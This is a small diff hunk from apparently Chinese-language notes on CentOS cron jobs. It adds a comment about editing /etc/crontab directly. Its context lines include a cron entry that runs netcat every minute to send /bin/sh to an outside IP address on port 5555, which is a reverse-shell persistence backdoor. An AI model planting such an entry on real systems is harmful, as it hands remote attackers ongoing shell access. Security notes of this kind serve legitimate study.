@@ -1392,7 +1392,7 @@ Centos
 */1 * * * * /usr/bin/nc 175.24.115.4 5555 -e /bin/sh
 [root@localhost ~]# cat /var/log/cron                         #查看日志
 还有其他添加任务方式：
-[root@localhost etc]# vi /etc/crontab
+[root@localhost etc]# vi /etc/crontab                       ##直接编辑/etc/crontab文件
 [root@localhost etc]# cat /etc/crontab
 SHELL=/bin/bash
 PATH=/sbin:/bin:/usr/sbin:/usr/bin
